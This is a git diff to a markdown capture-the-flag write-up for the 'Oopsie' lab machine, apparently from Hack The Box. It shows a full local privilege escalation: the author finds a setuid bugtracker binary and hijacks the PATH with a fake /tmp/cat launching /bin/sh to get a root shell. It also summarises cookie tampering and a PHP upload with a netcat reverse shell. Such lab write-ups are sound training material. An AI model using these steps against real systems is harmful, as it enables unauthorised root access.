@@ -4099,9 +4099,7 @@ robert@oopsie:~$ cat user.txt
 
 f2c74ee8db7983851ab2a96a44eb7981
 ```
-
-
-
+We can see here we have access to our seventeeth flag!
 
 Now we can try to advance out privilege to root:
 
@@ -4112,17 +4110,34 @@ sudo -l
 
 Sorry, user robert may not run sudo on oopsie.
 ```
+Unfortunately, this user does not have SUDO permissions.
+
+We can check ```id``` to see other potential users we can maybe mover to laterally.
+
 ```
 robert@oopsie:~$ id
-id
+
 uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)
+```
+We see here there is ```bugtracker``` who is also part of the group.
+
+We can investigate of there are any related files to this group user:
+
+```
 robert@oopsie:~$ find / -group bugtracker 2>/dev/null
-find / -group bugtracker 2>/dev/null
+
 /usr/bin/bugtracker
+
 robert@oopsie:~$ ls -la /usr/bin/bugtracker && file /usr/bin/bugtracker
+
 ls -la /usr/bin/bugtracker && file /usr/bin/bugtracker
+
 -rwsr-xr-- 1 root bugtracker 8792 Jan 25  2020 /usr/bin/bugtracker
 /usr/bin/bugtracker: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=b87543421344c400a95cbbe34bbc885698b52b8d, not stripped
+```
+We can see here from the output that this user has root access. We can see if we can somehow exploit their permissions:
+
+```
 robert@oopsie:~$ /usr/bin/bugtracker
 /usr/bin/bugtracker
 
@@ -4138,43 +4153,43 @@ cat: /root/reports/12: No such file or directory
 
 
 ```
+Here we may be able to exploit the cat command into giving us what we want. If we alter the cat command to instead launch a shell (coming from bugtracker would make it a root shell), we can trick it into giving us root access.
 
-
-
- 
 ```
 robert@oopsie:~$ cd ..
-cd ..
+
 robert@oopsie:/home$ ls
-ls
+
 robert
+
 robert@oopsie:/home$ cd ..
-cd ..
+
 robert@oopsie:/$ ls
 ls
 bin    dev   initrd.img      lib64       mnt   root  snap  tmp  vmlinuz
 boot   etc   initrd.img.old  lost+found  opt   run   srv   usr  vmlinuz.old
 cdrom  home  lib             media       proc  sbin  sys   var
-robert@oopsie:/$ cd tmp
-cd tmp
-robert@oopsie:/tmp$ echo '/bin/sh' > cat
-echo '/bin/sh' > cat
-robert@oopsie:/tmp$ ls
-ls
-cat
-robert@oopsie:/tmp$ chmod +x cat 
-chmod +x cat
 
-export PATH=/tmp:$PATH
-$ echo $PATH
-echo $PATH
-/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
+robert@oopsie:/$ cd tmp
+
+robert@oopsie:/tmp$ echo '/bin/sh' > cat
+
+robert@oopsie:/tmp$ ls
+
+cat
+
+robert@oopsie:/tmp$ chmod +x cat 
+
+robert@oopsie:/tmp$ export PATH=/tmp:$PATH
 
 robert@oopsie:/tmp$ echo $PATH
-echo $PATH
+
 /tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
+```
+Now that we have it set up, we can try ro relaunch bugtracker:
+
+```
 robert@oopsie:/tmp$ bugtracker
-bugtracker
 
 ------------------
 : EV Bug Tracker :
@@ -4185,61 +4200,44 @@ Provide Bug ID: 2
 ---------------
 
 # whoami
-whoami
+
 root
-# cd
-cd
+
 # ls
-ls
-user.txt
-# cd ..
-cd ..
-# ls
-ls
-robert
-# cd ..
-cd ..
-# ls
+
 ls
 bin    dev   initrd.img      lib64       mnt   root  snap  tmp  vmlinuz
 boot   etc   initrd.img.old  lost+found  opt   run   srv   usr  vmlinuz.old
 cdrom  home  lib             media       proc  sbin  sys   var
+
 # cd root
-cd root
+
 # ls
-ls
+
 reports  root.txt
-# cat root.txt
-cat root.txt
+
 # head root.txt
-head root.txt
+
 af13b0bee69f8a877c3faf667f7beacf
 ```
+ We see here we finally have access to our eighteenth flag!
  
- 
- 
- 
- 
- 
- 
- 
- 
- 
-
-## Conclusions - Level 1 Archtype
+ ## Conclusions - Level 2 Oopsie
 
 | # | 	Tools 	| Description |
 | :-----------: | :-----------: | :-----------: |
 | 1 | 	nmap   |    	Used for scanning ports on hosts. | 
-| 2 | 	winPEAS   |    	Windows  privilege escalation  |
+| 2 | 	burpsuite   |    	Web proxy intercept  |
 | 3 | 	netcat   |    	host listening to establish a reverse shell |  
-| 4 | 	MYSQLCLIENT.PY    |    	Logging into MYSQL database | 
-| 5 | 	PSEXEC.PY    |    	Administrative full shell acess | 
+
 
 | # | 	Vulnerabilities 	| Critical | High | Medium | Low |
 | :-----------: | :-----------: | :-----------: | :-----------: | :-----------: | :-----------: |
-| 1 | 	Insecure Password Storage  |    	X |  |  |  |
+| 1 | 	Insecure cookie handling  |    	X |  |  |  |
+| 2 | 	File upload type validation  |    	X |  |  |  |
 
-Using nmap, we were able to discover the host was running an SMB on port 445. Logging in, we were then able to get access to the users credentials from a stored file. We then used those credentials to log into MYSQL, where were able access a command line execution. Using netcat, we were then able to establish a reverse shell in order to find the user flag. We then used winPEAS, where we found the ADMIN credentials. Finally, we used those credentials in PSEXEC.PY in order to have full administrative access and grab the admin flag.
+Using nmap, we were able to discover the host was running an website on port 80. We were then able to get access to a login page using the url we found in burpsuite. We then used a guest login to enter, and manipulated the cookie storage to gain admin access. From there, we had access to an upload page, where we uploaded a php script onto the server and used netcat to relay a reverse shell.
+
+We then were able to find login credentials in the web folder for a user, which gave us the user flag. Analyzing the group list, we then found another user in the group who we exploited via the cat commanded to give us root access to the system; thereby giving us the final admin flag.
 
 [Table of Contents](#table-of-contents)
